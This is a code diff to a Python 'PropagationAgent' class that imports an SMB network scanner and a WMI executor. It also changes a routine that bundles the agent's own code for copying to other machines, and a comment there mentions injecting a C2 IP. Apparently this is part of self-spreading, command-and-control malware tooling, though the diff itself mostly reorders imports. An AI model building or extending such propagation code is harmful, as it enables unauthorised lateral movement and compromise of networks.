@@ -82,6 +82,20 @@ except ImportError:
 
 # Phase 1 Integration: Import real SMB Scanner (network discovery and viability scoring)
 try:
+    from .base import BaseAgent
+except ImportError:
+    # Add parent directory to path for direct script execution
+    sys.path.insert(0, str(Path(__file__).parent.parent))
+    from agents.base import BaseAgent
+
+# Logger must be defined before any import-time log calls below
+logging.basicConfig(level=logging.INFO, format="%(asctime)s [PROP-SEED] %(message)s")
+log = logging.getLogger("PROP-SEED")
+
+# --- Use core agent anatomy types ---
+from agent_core_anatomy import AgentID, AgentStatus, Mission, Event
+
+try:
     from network_propagation_scanner import SMBScanner, ViabilityRating
     SMB_SCANNER_AVAILABLE = True
 except ImportError:
@@ -97,17 +111,6 @@ except ImportError:
     WMI_EXECUTOR_AVAILABLE = False
     WMIExecutor = None  # type: ignore
     log.warning("[⚠️] Phase 2 WMI Executor unavailable")
-
-try:
-    from .base import BaseAgent
-except ImportError:
-    # Add parent directory to path for direct script execution
-    sys.path.insert(0, str(Path(__file__).parent.parent))
-    from agents.base import BaseAgent
-logging.basicConfig(level=logging.INFO, format="%(asctime)s [PROP-SEED] %(message)s")
-log = logging.getLogger("PROP-SEED")
-# --- Use core agent anatomy types ---
-from agent_core_anatomy import AgentID, AgentStatus, Mission, Event
 
 
 class PropagationAgent(BaseAgent):
@@ -748,14 +751,18 @@ class PropagationAgent(BaseAgent):
     # ------------------------------------------------------------------
     def _prepare_bundle(self) -> Path:
         bundle = Path(tempfile.mkdtemp(prefix="br_bundle_"))
-        targets = ["agents", "core.py", "run.py", "requirements.txt"]
+        repo_root = Path(__file__).parent.parent
+        targets = ["agents", "kernel", "core", "run.py", "requirements.txt"]
         for item in targets:
             src = Path(item)
-            dst = bundle / src.name
-            if src.is_dir():
-                shutil.copytree(src, dst)
-            elif src.is_file():
-                shutil.copy2(src, dst)
+            if not src.exists():
+                src = repo_root / item
+            if src.exists():
+                dst = bundle / src.name
+                if src.is_dir():
+                    shutil.copytree(src, dst)
+                elif src.is_file():
+                    shutil.copy2(src, dst)
         
         # ✅ PHASE 1: Inject C2 IP into remote config
         try:
